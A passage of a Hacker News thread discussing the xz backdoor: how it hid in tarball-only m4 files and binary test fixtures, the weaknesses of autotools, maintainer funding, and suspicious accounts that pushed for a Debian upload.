[root](#39866102) | [parent](#39867729) | [next](#39875555) [–]  People don't know how to use git hashes, and it's not been "done". Whereas downloading tarballs and verifying hashes of the tarball has been "good enough" because the real thing it's been detecting is communication faults, not supply chain attacks. People also like version numbers like 2.5.1 but that's not a hash, and you can only indirectly make it a hash. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39875555)   | [root](#39866102) | [parent](#39866762) | [prev](#39867439) | [next](#39867281) [–]  > I would go further than that: all files which are in a distributed tarball, but not on the corresponding git repository, should be treated as suspect. This and the automated A/B / diff to check the tarball against the repo, flag if mismatched. | | --- | --- | --- | | | |  |  | [nicolas\_17](user?id=nicolas_17) [9 months ago](item?id=39867281)   | [root](#39866102) | [parent](#39866309) | [prev](#39866762) | [next](#39867364) [–]  The backdoor is in an .m4 file that gets parsed by autoconf to generate the configure script. Running autoconf yourself won't save you. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39868296)   | [root](#39866102) | [parent](#39867281) | [next](#39867364) [–]  That's not entirely true. autoreconf will regenerate m4/build-to-host.m4 but only if you delete it first. | | --- | --- | --- | | | |  |  | [tobias2014](user?id=tobias2014) [9 months ago](item?id=39867364)   | [root](#39866102) | [parent](#39866309) | [prev](#39867281) | [next](#39869119) [–]  It seems like this was the solution for archlinux, pull directly from the github tag and run autogen: [https://gitlab.archlinux.org/archlinux/packaging/packages/xz...](https://gitlab.archlinux.org/archlinux/packaging/packages/xz/-/commit/881385757abdc39d3cfea1c3e34ec09f637424ad) | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39870114)   | [root](#39866102) | [parent](#39867364) | [next](#39869119) [–]  it's shocking how many packages on distros are just one random tarball from the internet with lipstick | | --- | --- | --- | | | |  |  | [k8svet](user?id=k8svet) [9 months ago](item?id=39869119)   | [root](#39866102) | [parent](#39866309) | [prev](#39867364) | [next](#39872081) [–]  Oh come on, please, let's put autotools out to pasture. I've lost so much of my life fighting autotools crap compared to "just use meson". | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39928364)   | [root](#39866102) | [parent](#39869119) | [next](#39872081) [–]  As long as we also exterminate it's even more evil brother - libtool. | | --- | --- | --- | | | |  |  | [snnn](user?id=snnn) [9 months ago](item?id=39872081)   | [root](#39866102) | [parent](#39866309) | [prev](#39869119) | [next](#39866393) [–]  I don't think it would help much. I work on machine learning frameworks. A lot of them(and math libraries) rely on just in time compilation. None of us has the time or expertise to inspect JIT-ed assembly code. Not even mentioning that much of the code deliberately read/write out of bound, which is not an issue if you always add some extra bytes at the end of each buffer, which could make most memory sanitizer tools useless. When you run their unit tests, you run the JIT code, then a lot of things could happen. Maybe we should ask all packaging systems splitting their build into compile and test two stages, to ensure that a testing code would not impact the binaries that are going to be published. I would rather to read and analysis the generated code instead of the code that generates it. | | --- | --- | --- | | | |  |  | [anthk](user?id=anthk) [9 months ago](item?id=39866393)   | [root](#39866102) | [parent](#39866309) | [prev](#39872081) | [next](#39870445) [–]  I always run autoreconfig -ifv first. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866480)   | [root](#39866102) | [parent](#39866393) | [next](#39870445) [–]  In this case it wouldn't be sufficient. You had to also delete m4/build-to-host.m4 for autoreconf to recreate it. | | --- | --- | --- | | | |  |  | [anthk](user?id=anthk) [9 months ago](item?id=39873710)   | [root](#39866102) | [parent](#39866480) | [next](#39870445) [–]  Thanks. At least the distro I use (Hyperbola) it's LTS bound, so is not affected. | | --- | --- | --- | | | |  |  | [pornel](user?id=pornel) [9 months ago](item?id=39870445)   | [root](#39866102) | [parent](#39866161) | [prev](#39866309) | [next](#39885513) [–]  Maybe it's time to dramatically simplify autoconf? How long do we need to (pretend to) keep compatibility with pre-ANSI C compilers, broken shells on exotic retro-unixes, and running scripts that check how many bits are in a byte? | | --- | --- | --- | | | |  |  | [phendrenad2](user?id=phendrenad2) [9 months ago](item?id=39885513)   | [root](#39866102) | [parent](#39866161) | [prev](#39870445) | [next](#39871901) [–]  Not just autoconf. Build systems in general are a bad abstraction, which leads to lots and lots of code to try to make them do what you want. It's a sad reality of the mismatch between a prodecural task (compile files X, Y, and Z into binary A) and what we want (compile some random subset of files X, Y, and Z, doing an arbitrary number of other tasks first, into binary B). For fun, you can read the responses to my musing that maybe build systems aren't needed: <https://news.ycombinator.com/item?id=35474996> (People can't imagine programming without a build system - it's sad) | | --- | --- | --- | | | |  |  | [hgs3](user?id=hgs3) [9 months ago](item?id=39871901)   | [root](#39866102) | [parent](#39866161) | [prev](#39885513) | [next](#39875521) [–]  Autoconf is m4 macros and Bourne shell. Most mainstream programming languages have a packaging system that lets you invoke a shell script. This attack is a reminder to keep your shell scripts clean. Don't treat them as an afterthought. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39875521)   | [root](#39866102) | [parent](#39866161) | [prev](#39871901) | [next](#39870139) [–]  I'm wondering is there i.e. no way to add an automated flagging system that A/B / `diff` checks the tarball contents against the repo's files and warns if there's a mismatch? This would be on i.e. GitHub's end so that there'd be this sort of automated integrity test and subsequent warning? Just a thought, since tainted tarballs like these might be altogether be (and become) a threat vector, regardless of the repo. | | --- | --- | --- | | | |  |  | [demizer](user?id=demizer) [9 months ago](item?id=39870139)   | [root](#39866102) | [parent](#39866161) | [prev](#39875521) | [next](#39866211) [–]  Maybe the US Government needs to put its line in the sand and mandate the end of autotools. :D | | --- | --- | --- | | | |  |  | [resonious](user?id=resonious) [9 months ago](item?id=39881642)   | [root](#39866102) | [parent](#39870139) | [next](#39866211) [–]  It looks like they are trying to get rid of C, so maybe in luck! | | --- | --- | --- | | | |  |  | [omoikane](user?id=omoikane) [9 months ago](item?id=39866211)   | [parent](#39866102) | [prev](#39866161) | [next](#39866583) [–]  It looks like an earlier commit with a binary blob "test data" contained the bulk of the backdoor, then the configure script enabled it, and then later commits patched up valgrind errors caused by the backdoor. See the commit links in the "Compromised Repository" section. Also, seems like the same user who made these changes are still submitting changes to various repositories as of a few days ago. Maybe these projects need to temporarily stop accepting commits until further review is done? | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39866583)   | [parent](#39866102) | [prev](#39866211) | [next](#39866150) [–]  The use of "eval" stands out, or at least it *should* stand out – but there are two more instances of it in the same script, which presumably are not used maliciously. A while back there was a discussion[0] of an arbitrary code execution vulnerability in exiftool which was also the result of "eval". Avoiding casual use of this overpowered footgun might make it easier to spot malicious backdoors. Usually there is a better way to do it in almost all cases where people feel the need to reach for "eval", unless the feature you're implementing really is "take a piece of arbitrary code from the user and execute it". [0] <https://news.ycombinator.com/item?id=39154825> | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39867571)   | [root](#39866102) | [parent](#39866583) | [next](#39868421) [–]  Unfortunately eval in a shell script has an effect on the semantics but is not necessary to do some kind of parsing of the contents of a variable, unlike Python or Perl or JavaScript. A ```     $goo  ``` line (without quotes) will already do word splitting, though it won't do another layer of variable expansion and unquoting, for which you'll need ```     eval "$goo"  ``` (This time with quotes). | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39868421)   | [root](#39866102) | [parent](#39866583) | [prev](#39867571) | [next](#39876695) [–]  eval in autoconf macros is nothing unusual. In (pre-backdoor) xz 5.4.5: ```   $ grep -wl eval m4/*   m4/gettext.m4   m4/lib-link.m4   m4/lib-prefix.m4   m4/libtool.m4 ``` | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39876695)   | [root](#39866102) | [parent](#39866583) | [prev](#39868421) | [next](#39866150) [–]  > Usually there is a better way to do it in almost all cases where people feel the need to reach for "eval" unfortunately thats just standard in configure scripts, for example from python: ``` grep eval Python-3.12.2/configure | wc -l 165 ``` and its 32,958 lines of code, plenty of binary fixtures as well in the tarball to hide stuff. who knows, but I have feeling us finding the backdoor in this case was more of a happy accident. | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39866150)   | [parent](#39866102) | [prev](#39866583) | [next](#39866443) [–]  Yeah, now imagine they succeeded and it didn't cause any performance issues... Can we even be sure no such successful attempt has already been made? | | --- | --- | --- | | | |  |  | [coldpie](user?id=coldpie) [9 months ago](item?id=39867539)   | [root](#39866102) | [parent](#39866150) | [next](#39866853) [–]  You can be certain it has happened, many times. Now think of all the software we mindlessly consume via docker, language package managers, and the like. Remember, there is no such thing as computer security. Make your decisions accordingly :) | | --- | --- | --- | | | |  |  | [gpvos](user?id=gpvos) [9 months ago](item?id=39866853)   | [root](#39866102) | [parent](#39866150) | [prev](#39867539) | [next](#39866443) [–]  No, we can't. | | --- | --- | --- | | | |  |  | [tetromino\_](user?id=tetromino_) [9 months ago](item?id=39866443)   | [parent](#39866102) | [prev](#39866150) | [next](#39866295) [–]  A big part of the problem is all the tooling around git (like the default github UI) which hides diffs for binary files like these pseudo-"test" files. Makes them an ideal place to hide exploit data since comparatively few people would bother opening a hex editor manually. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39866840)   | [root](#39866102) | [parent](#39866443) | [next](#39867021) [–]  How many people read autoconf scripts, though? I think those filters are symptom of the larger problem that many popular C/C++ codebases have these gigantic build files which even experts try to avoid dealing with. I know why we have them but it does seem like something which might be worth reconsidering now that the tool chain is considerably more stable than it was in the 80s and 90s. | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39867591)   | [root](#39866102) | [parent](#39866840) | [next](#39868076) [–]  How many people read build.rs files of all the transitive dependencies of a moderately large Rust project? Autoconf is bad in this respect but it's not like the alternatives are better (maybe Bazel). | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39874246)   | [root](#39866102) | [parent](#39867591) | [next](#39873148) [–]  The alternatives are \_better\_ but still not great. build.rs is much easier to read and audit, for example, but it’s definitely still the case that people probably skim past it. I know that the Rust community has been working on things like build sandboxing and I’d expect efforts to be a lot easier there than in a mess of m4/sh where everyone is afraid to break 4 decades of prior usage. | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39877445)   | [root](#39866102) | [parent](#39874246) | [next](#39873148) [–]  build.rs is easier to read, but it's the tip of the iceberg when it comes to auditing. If I were to sneak in some underhanded code, I'd do it through either *a dependency* that is used by build.rs (not unlike what was done for xz) or a crate purporting to implement a very useful procedural macro... | | --- | --- | --- | | | |  |  | [bdd8f1df777b](user?id=bdd8f1df777b) [9 months ago](item?id=39873148)   | [root](#39866102) | [parent](#39867591) | [prev](#39874246) | [next](#39868076) [–]  Bazel has its problems but the readability is definitely better. And bazel BUILD files are quite constrained in what it can do. | | --- | --- | --- | | | |  |  | [salawat](user?id=salawat) [9 months ago](item?id=39868076)   | [root](#39866102) | [parent](#39866840) | [prev](#39867591) | [next](#39867021) [–]  I mean, autoconf is basically a set of template programs for snffing out whether a system has X symbol available to the linker. Any replacement for it would end up morphing into it over time. Some things are just that complex. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39869600)   | [root](#39866102) | [parent](#39868076) | [next](#39867021) [–]  We have much better tools now and much simpler support matrices, though. When this stuff was created, you had more processor architectures, compilers, operating systems, etc. and they were all much worse in terms of features and compatibility. Any C codebase in the 90s was half #ifdef blocks with comments like “DGUX lies about supporting X” or “SCO implemented Y but without option Z so we use Q instead”. | | --- | --- | --- | | | |  |  | [salawat](user?id=salawat) [9 months ago](item?id=39886046)   | [root](#39866102) | [parent](#39869600) | [next](#39867021) [–]  That's the essence of programming in C though... You figure out what the hardware designers *actually* did, and get the program written to accommodate it. | | --- | --- | --- | | | |  |  | [johnny22](user?id=johnny22) [9 months ago](item?id=39867021)   | [root](#39866102) | [parent](#39866443) | [prev](#39866840) | [next](#39867568) [–]  I don't see how showing the binary diffs would help. 99.99999% of people would just scroll right past them anyways. | | --- | --- | --- | | | |  |  | [AeroNotix](user?id=AeroNotix) [9 months ago](item?id=39867612)   | [root](#39866102) | [parent](#39867021) | [next](#39867568) [–]  Even in binary you can see patterns. Not saying it's perfect to show binary diffs (but it is better than showing nothing) but I know even my slow mammalian brain can spot obvious human readable characters in various binary encoding formats. If I see a few in a row which doesn't make sense, why wouldn't I poke it? | | --- | --- | --- | | | |  |  | [janc\_](user?id=janc_) [9 months ago](item?id=39869378)   | [root](#39866102) | [parent](#39867612) | [next](#39867649) [–]  This particular file was described as an archive file with corrupted data somewhere in the middle. Assuming you wanted to scroll that far through a hexdump of it, there could be pretty much any data in there without being suspicious. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39867649)   | [root](#39866102) | [parent](#39867612) | [prev](#39869378) | [next](#39868709) [–]  What should I look for? The evil bit set? | | --- | --- | --- | | | |  |  | [johnny22](user?id=johnny22) [9 months ago](item?id=39868709)   | [root](#39866102) | [parent](#39867612) | [prev](#39867649) | [next](#39867568) [–]  Sure, the same person who's gonna be looking is the same person who'd click "show diff" | | --- | --- | --- | | | |  |  | [bangoodirro](user?id=bangoodirro) [9 months ago](item?id=39867568)   | [root](#39866102) | [parent](#39866443) | [prev](#39867021) | [next](#39867476) [–]  00011900: 0000 4883 f804 7416 b85f 5f5f 5f33 010f ..H...t..\_\_\_\_3.. │ 00011910: b651 0483 f25a 09c2 0f84 5903 0000 488d .Q...Z....Y...H. │ 00011920: 7c24 40e8 5875 0000 488b 4c24 4848 3b4c |$@.Xu..H.L$HH;L │ 00011930: 2440 7516 4885 c074 114d 85ff 0f84 3202 $@u.H..t.M....2. │ 00011940: 0000 498b 0ee9 2c02 0000 b9fe ffff ff45 ..I...,........E │ 00011950: 31f6 4885 db74 0289 0b48 8bbc 2470 1300 1.H..t...H..$p.. │ 00011960: 0048 85ff 0f85 c200 0000 0f57 c00f 2945 .H.........W..)E │ 00011970: 0048 89ac 2470 1300 0048 8bbc 2410 0300 .H..$p...H..$... │ 00011980: 0048 8d84 2428 0300 0048 39c7 7405 e8ad .H..$(...H9.t... │ 00011990: e6ff ff48 8bbc 24d8 0200 0048 8d84 24f0 ...H..$....H..$. │ 000119a0: 0200 0048 39c7 7405 e893 e6ff ff48 8bbc ...H9.t......H.. │ 000119b0: 2480 0200 0048 8d84 2498 0200 0048 39c7 $....H..$....H9. │ 000119c0: 7405 e879 e6ff ff48 8bbc 2468 0100 004c t..y...H..$h...L │ Please tell me what this code does, Sheldon | | --- | --- | --- | | | |  |  | [tetromino\_](user?id=tetromino_) [9 months ago](item?id=39868259)   | [root](#39866102) | [parent](#39867568) | [next](#39867476) [–]  You're right - the two exploit files are lzma-compressed and then deliberately corrupted using `tr`, so a hex dump wouldn't show anything immediately suspicious to a reviewer. Mea culpa! | | --- | --- | --- | | | |  |  | [maxcoder4](user?id=maxcoder4) [9 months ago](item?id=39869394)   | [root](#39866102) | [parent](#39868259) | [next](#39867476) [–]  Is this lzma compressed? Hard to tell because of the lack of formatting, but this looks like amd64 shellcode to me. But that's not really important to the point - I'm not looking at a diff of every committed favicon.ico or ttf font or a binary test file to make sure it doesn't contain a shellcode. | | --- | --- | --- | | | |  |  | [bangoodirro](user?id=bangoodirro) [9 months ago](item?id=39874005)   | [root](#39866102) | [parent](#39869394) | [next](#39867476) [–]  it's just an arbitrary section of libcxx-18.1.1/lib/libc++abi.so.1.0 | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867476)   | [root](#39866102) | [parent](#39866443) | [prev](#39867568) | [next](#39876748) [–]  testdata should not be on the same machine as the build is done. testdata (and tests generally) aren't as well audited, and therefore shouldn't be allowed to leak into the finished product. Sure - you want to test stuff, but that can be done with a special "test build" in it's own VM. | | --- | --- | --- | | | |  |  | [hanwenn](user?id=hanwenn) [9 months ago](item?id=39875884)   | [root](#39866102) | [parent](#39867476) | [next](#39870378) [–]  In the Bazel build system, you would mark the test data blob as testonly=1. Then the build system guarantees that the blob can only be used in tests. This incident shows that killing the autoconf goop is long overdue. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39870378)   | [root](#39866102) | [parent](#39867476) | [prev](#39875884) | [next](#39876748) [–]  That could easily double build cost. Most open-source package repositories are not exactly in a position to splurge on their build infra. | | --- | --- | --- | | | |  |  | [lyu07282](user?id=lyu07282) [9 months ago](item?id=39876748)   | [root](#39866102) | [parent](#39866443) | [prev](#39867476) | [next](#39866295) [–]  in this case the backdoor was hidden in a nesting doll of compressed data manipulated with head/tail and tr, even replacing byte ranges inbetween. Would've been impossible to find if you were just looking at the test fixtures. | | --- | --- | --- | | | |  |  | [20after4](user?id=20after4) [9 months ago](item?id=39866295)   | [parent](#39866102) | [prev](#39866443) | [next](#39874234) [–]  > "Given the activity over several weeks, the committer is either directly involved or there was some quite severe compromise of their system. Unfortunately the latter looks like the less likely explanation, given they communicated on various lists about the "fixes" mentioned above." Crazy indeed. | | --- | --- | --- | | | |  |  | [Decabytes](user?id=Decabytes) [9 months ago](item?id=39874234)   | [prev](#39866102) | [next](#39866296) [–]  So when are we going to stop pretending that OSS maintainers/projects are reaping what they sow when they "work for free" and give away their source code away using OSS licensed software, while large companies profit off of them? If they were paid more (or in some cases even actually paid), then they could afford to quit their day jobs, reducing burn out, they could actually hire a team of trusted vetted devs instead of relying on the goodwill of strangers who step up "just to help them out" and they could pay security researchers to vet their code. Turns out burned out maintainers are a great attack vector and if you are willing to play the long game you can ingratiate yourself with the community with your seemingly innocuous contributions. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39876656)   | [parent](#39874234) | [next](#39877712) [–]  Paid people get burnt out as well and they are just as likely to accept free help as an unpaid person. | | --- | --- | --- | | | |  |  | [Decabytes](user?id=Decabytes) [9 months ago](item?id=39878479)   | [root](#39874234) | [parent](#39876656) | [next](#39877712) [–]  That's true, but many of these maintainers work a day job on top of doing the open source work precisely because the open source work doesn't pay the bills. If they could get back 40 hours of their time I think many would appreciate it | | --- | --- | --- | | | |  |  | [qwery](user?id=qwery) [9 months ago](item?id=39877712)   | [parent](#39874234) | [prev](#39876656) | [next](#39881198) [–]  > So when are we going to stop pretending ... I'm not sure that we are. Doesn't everybody know that developing/maintaining free software is largely thankless work, with little to no direct recompense? I don't think moving towards unfree software is a good way to make free software more secure. It shouldn't be a surprise that proprietary software is less likely to be exploited *in this way* simply because they don't accept any patches from outside of the team. What you want is more people that understand and care about free software and *low* barriers to getting involved. | | --- | --- | --- | | | |  |  | [Decabytes](user?id=Decabytes) [9 months ago](item?id=39878893)   | [root](#39874234) | [parent](#39877712) | [next](#39881198) [–]  > Doesn't everybody know that developing/maintaining free software is largely thankless work, with little to no direct recompense? No I don't think that is a universally acknowledged feeling. Numerous maintainers have detailed recieving entitled demands from users, as if they were paying customers to the open source software projects. Georges Stavracas' interview on the Tech over Tea podcast^1 describes many such experiences. Similarly, when Aseprite transitioned its license^2 to secure financial stability, it faced backlash from users accusing the developer of betraying and oppressing the community. On the flipside, if everyone truly does know this is the case, then it's a shame that so many people know, and yet are unwilling to financially support developers to change that. See all of the developers for large open source projects who have day jobs, or take huge pay cuts to work on open source projects. I get that not everyone can support a project financially, but I've personally tried to break that habit of expecting everything I use to be free, and go out of my way to look for donation buttons for project maintainers, and raise awareness during fundraisers. Now if only I could donate directly to Emacs development... I'd encourage other people to do the same. > What you want is more people that understand and care about free software and low barriers to getting involved. This is tough. For example, the intention behind initiatives like DigitalOcean's Hacktoberfest, are designed to do just this. It is a good idea in theory, submit 4 pull requests and win a tshirt, but not in practice. The event has been criticized for inadvertently encouraging superficial contributions, such as minor text edits or trivial commits, which burden maintainers^3, causing many maintainers to just archive their repos for the month of October. So, while there's a recognition of the need for more people who understand and value free software, along with lower barriers to entry, the current state of affairs often falls short. The path forward should involve not just increasing awareness and participation but also providing meaningful support and compensation to maintainers. By doing so, we can foster a more sustainable, secure, and vibrant open source community. Or at least that is how I feel... 1. <https://www.youtube.com/watch?v=kO0V7BE1bEo> 2. <https://github.com/aseprite/aseprite/issues/1242> 3. <https://twitter.com/shitoberfest?lang=en> | | --- | --- | --- | | | |  |  | [qwery](user?id=qwery) [9 months ago](item?id=39882829)   | [root](#39874234) | [parent](#39878893) | [next](#39881198) [–]  To be clear, I'm not at all against compensating developers for their work. I am not trying to argue that people do not need to be supported financially, or that you shouldn't donate, or that no one should be able to make a living working on free software, and so on. What I'm saying is that paying people (or having a trusted security team) to work on software necessarily makes it less free. Note that "less free" doesn't mean worthless and absolutely free isn't the ideal. Sorry, I used "everybody" to mean a subset of everybody -- the "we" that you referred to, or people generally involved in open source software development. > it's a shame that so many people know, and yet are unwilling to financially support developers to change that. Regardless of which set of everyone, this is undoubtedly the case. However, I'm not sure that paying (some of) the developers a wage is the best way to improve the software, particularly as free software. > initiatives like DigitalOcean's Hacktoberfest, are designed to do just this. You've got this backwards. Hacktoberfest is a scheme to pay (more) people to contribute (more) to open source projects. This is an example of why paying people to work on open source doesn't necessarily improve the software. It also doesn't lower any barriers, it just increases the incentive to overcome them. So while this might increase the number of people contributing[0] to open source projects, it doesn't directly increase the number of people who understand and care about the specific project they're contributing to, let alone the broader free software movement. In short, you can't pay people to care. [0] according to their pretty weak metric for what contributing is | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39881198)   | [parent](#39874234) | [prev](#39877712) | [next](#39866296) [–]  OSS maintainers aren't reaping anything. Most OSS licenses say the software is provided without warranty. | | --- | --- | --- | | | |  |  | [thesnide](user?id=thesnide) [9 months ago](item?id=39866296)   | [prev](#39874234) | [next](#39868864) [–]  The discussion to upload it to Debian is interesting on its own <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708> | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39866425)   | [parent](#39866296) | [next](#39866747) [–]  Wow, that's a lot of anonymous accounts adding comments there urging for a fast merge! And this "Hans Jansen" guy is apparently running around salsa.debian.org pushing for more updates in other projects as well: <https://salsa.debian.org/users/hjansen/activity> | | --- | --- | --- | | | |  |  | [ValdikSS](user?id=ValdikSS) [9 months ago](item?id=39868584)   | [root](#39866296) | [parent](#39866425) | [next](#39867689) [–]  >that's a lot of anonymous accounts Just FYI, krygorin4545@proton.me (the latest message before the upload) was created Tue Mar 26 18:30:02 UTC 2024, about an hour earlier than the message was posted. Proton generates PGP key upon creating the account, with the real datetime of the key (but the key does not include the timezone). | | --- | --- | --- | | | |  |  | [matthews2](user?id=matthews2) [9 months ago](item?id=39867689)   | [root](#39866296) | [parent](#39866425) | [prev](#39868584) | [next](#39868107) [–]  > running around salsa.debian.org pushing for more updates in other projects as well This is quite common in most (all?) distributions. People are going through lists of outdated packages, updating them, testing them, and pushing them. | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [9 months ago](item?id=39867895)   | [root](#39866296) | [parent](#39867689) | [next](#39868107) [–]  That account seems to be a contributor for xz though, you can see him interact a lot with the author of the backdoor on the GitHub repo. Some pull requests seem to be just the two of them discussing and merging stuff (which is normal but looks weird in this context) | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [9 months ago](item?id=39868107)   | [root](#39866296) | [parent](#39866425) | [prev](#39867689) | [next](#39866747) [–]  And now we see why I don't trust anons, aliases, or anime characters to make contributions. My GitHub says exactly who I am! | | --- | --- | --- | | | |  |  | [kunagi7](user?id=kunagi7) [9 months ago](item?id=39876029)   | [root](#39866296) | [parent](#39868107) | [next](#39872536) [–]  Even if they have a "real" picture or a credible description that is not good enough. Instead of using an anime character a malicious actor could use an image generator [0], they could generate a few images, obtain something credible to most folks, and use that to get a few fake identities going. Sadly, trusting people to be the real thing and not a fake identity on the Internet is difficult now and it will get worse. [0] <https://thispersondoesnotexist.com> | | --- | --- | --- | | | |  |  | [kgeist](user?id=kgeist) [9 months ago](item?id=39872536)   | [root](#39866296) | [parent](#39868107) | [prev](#39876029) | [next](#39872419) [–]  You can quite easily generate a realistic photo, bio, even entire personal blogs and GitHub projects, using generative AI, to make it look like it's a real person. | | --- | --- | --- | | | |  |  | [isbvhodnvemrwvn](user?id=isbvhodnvemrwvn) [9 months ago](item?id=39872625)   | [root](#39866296) | [parent](#39872536) | [next](#39872419) [–]  With close to zero OSS participation rate you can just pick a real living person and just keep in sync with their LinkedIn. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39872419)   | [root](#39866296) | [parent](#39868107) | [prev](#39872536) | [next](#39866747) [–]  It has been on the agenda for years to identify FOSS contributors with an id… Wet dream for authoritarians like you. What would it solve when identity theft happens on a mass scale on a day to day basis? It'd just ruin the life of some random person whose identity got stolen to create the account… | | --- | --- | --- | | | |  |  | [nammi](user?id=nammi) [9 months ago](item?id=39866747)   | [parent](#39866296) | [prev](#39866425) | [next](#39867301) [–]  That name jumped out at me, Hans Jansen is the name Dominic Monaghan used when posing as a German interviewer with Elijah Woods. Not that it can't be a real person <https://youtu.be/IfhMILe8C84> | | --- | --- | --- | | | |  |  | [rsync](user?id=rsync) [9 months ago](item?id=39868367)   | [root](#39866296) | [parent](#39866747) | [next](#39867537) [–]  Hans Gruber would have Been a much more stylish choice… | | --- | --- | --- | | | |  |  | [joeyh](user?id=joeyh) [9 months ago](item?id=39867537)   | [root](#39866296) | [parent](#39866747) | [prev](#39868367) | [next](#39867301) [–]  See comments about "Hans Janson" upthread, he appeared to collaborate on the exploit in other ways as well. | | --- | --- | --- | | | |  |  | [oasisaimlessly](user?id=oasisaimlessly) [9 months ago](item?id=39867301)   | [parent](#39866296) | [prev](#39866747) | [next](#39866923) [–]  For anyone else feeling some deja vu about ifunc / Valgrind errors, this Red Hat issue [1] was previously linked from HN 12 days ago [2]. [1]: <https://bugzilla.redhat.com/show_bug.cgi?id=2267598> [2]: <https://news.ycombinator.com/item?id=39733185> | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39866923)   | [parent](#39866296) | [prev](#39867301) | [next](#39868864) [–]  I get the feeling that a number of the comments are all the same person / group. | | --- | --- | --- | | | |  |  | [rpigab](user?id=rpigab) [9 months ago](item?id=39868864)   | [prev](#39866296) | [next](#39866771) [–]  I'd love to be at Microsoft right now and have the power to review this user's connection history to Github, even though VPN exists, many things can be learned from connection habits, links to ISPs, maybe even guess if VPNs were used, roundtrip time on connections can give hints. I really don't think some random guy wants to weaken ssh just to extract some petty ransomware cash from a couple targets. | | --- | --- | --- | | | |  |  | [qecez](user?id=qecez) [9 months ago](item?id=39870242)   | [parent](#39868864) | [next](#39873261) [–]  > I really don't think some random guy wants to weaken ssh just to extract some petty ransomware cash from a couple targets. Which is why there's probably nothing remotely interesting in them logs. | | --- | --- | --- | | | |  |  | [mhh\_\_](user?id=mhh__) [9 months ago](item?id=39871586)   | [root](#39868864) | [parent](#39870242) | [next](#39873261) [–]  Intelligence agencies get caught red handed all the time so I wouldn't be too sure. If it was an organised group I'm sure they were careful, of course, but it only takes one fuckup. | | --- | --- | --- | | | |  |  | [RockRobotRock](user?id=RockRobotRock) [9 months ago](item?id=39873261)   | [parent](#39868864) | [prev](#39870242) | [next](#39877363) [–]  Nah. I'm sure Microsoft got a call from the alphabet boys and nobody, not even internal employees are allowed to look at the logs right now. | | --- | --- | --- | | | |  |  | [megous](user?id=megous) [9 months ago](item?id=39877363)   | [parent](#39868864) | [prev](#39873261) | [next](#39872929) [–]  Oh my, another reason not to use github. :D So many reasons poping up just in this comment section alone. | | --- | --- | --- | | | |  |  | [optimalsolver](user?id=optimalsolver) [9 months ago](item?id=39872929)   | [parent](#39868864) | [prev](#39877363) | [next](#39872544) [–]  I'm guessing Microsoft just got a call from the Government telling them not to look too deeply into it. | | --- | --- | --- | | | |  |  | [alpb](user?id=alpb) [9 months ago](item?id=39872544)   | [parent](#39868864) | [prev](#39872929) | [next](#39866771) [–]  That’d be illegal for an employee to do. | | --- | --- | --- | | | |  |  | [sapiogram](user?id=sapiogram) [9 months ago](item?id=39880483)   | [root](#39868864) | [parent](#39872544) | [next](#39866771) [–]  Why? | | --- | --- | --- | | | |  |  | [alpb](user?id=alpb) [9 months ago](item?id=39897089)   | [root](#39868864) | [parent](#39880483) | [next](#39866771) [–]  You can't access personally identify information out of curiosity. That's a fireable offense in nearly any company that cares about privacy. | | --- | --- | --- | | | |  |  | [alright2565](user?id=alright2565) [9 months ago](item?id=39866771)   | [prev](#39868864) | [next](#39873017) [–]  [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/42fbb038b4f36c9d1830144bafa6c9d0d101aaa9#diff-0eb547304658805aad788d320f10bf1f292797b5e6d745a3bf617584da017051R83-R87) > Note: GitHub automatically includes two archives Source code (zip) and Source code (tar.gz) in the releases. These archives cannot be disabled and should be ignored. The author was thinking ahead! Latest commit hash for this repo: 8a3b5f28d00ebc2c1619c87a8c8975718f12e271 | | --- | --- | --- | | | |  |  | [rom1v](user?id=rom1v) [9 months ago](item?id=39869208)   | [parent](#39866771) | [next](#39867905) [–]  Btw, this is not the only project providing a source tarball different from the git repo, for example libusb also does this (and probably others): - [https://github.com/libusb/libusb/issues/1468#issuecomment-19...](https://github.com/libusb/libusb/issues/1468#issuecomment-1974787595) - <https://github.com/orgs/community/discussions/6003> | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39872062)   | [root](#39866771) | [parent](#39869208) | [next](#39867905) [–]  It's very common in autoconf codebases because the idea is that you untar and then run `./configure ...` rather than `autoreconf -fi && ./configure ...`. But to do that either you have to commit `./configure` or you have to make 